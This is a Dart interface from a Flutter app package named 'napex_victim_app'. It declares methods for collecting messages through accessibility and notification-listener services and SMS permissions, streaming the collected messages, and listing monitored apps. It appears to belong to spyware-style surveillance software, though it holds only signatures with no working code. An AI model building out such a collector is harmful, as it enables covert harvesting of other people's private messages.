import 'package:napex_victim_app/core/error/failures.dart';
import 'package:napex_victim_app/domain/entities/message.dart';

abstract interface class CollectorRepository {
  /// بدء خدمة الجمع (Foreground Service + الاشتراك في البث)
  Future<(bool, Failure?)> startCollection();

  /// إيقاف الجمع
  Future<(bool, Failure?)> stopCollection();

  /// هل الجمع نشط؟
  Future<bool> isCollecting();

  /// حالة خدمة إمكانية الوصول
  Future<bool> isAccessibilityEnabled();

  /// حالة خدمة الإشعارات
  Future<bool> isNotificationListenerEnabled();

  /// فتح إعدادات إمكانية الوصول
  Future<(bool, Failure?)> openAccessibilitySettings();

  /// فتح إعدادات الإشعارات
  Future<(bool, Failure?)> openNotificationSettings();

  /// طلب صلاحية الإشعارات (POST_NOTIFICATIONS)
  Future<bool> requestNotificationPermission();

  /// هل صلاحية الإشعارات ممنوحة؟
  Future<bool> isNotificationPermissionGranted();

  /// طلب صلاحية الرسائل النصية (RECEIVE/READ SMS)
  Future<bool> requestSmsPermission();

  /// هل صلاحية الرسائل النصية ممنوحة؟
  Future<bool> isSmsPermissionGranted();

  /// بث الرسائل المُجمَّعة من خدمات النظام
  Stream<CollectedMessage> get messageStream;

  /// قائمة التطبيقات المُراقَبة
  Future<List<String>> getMonitoredApps();
}
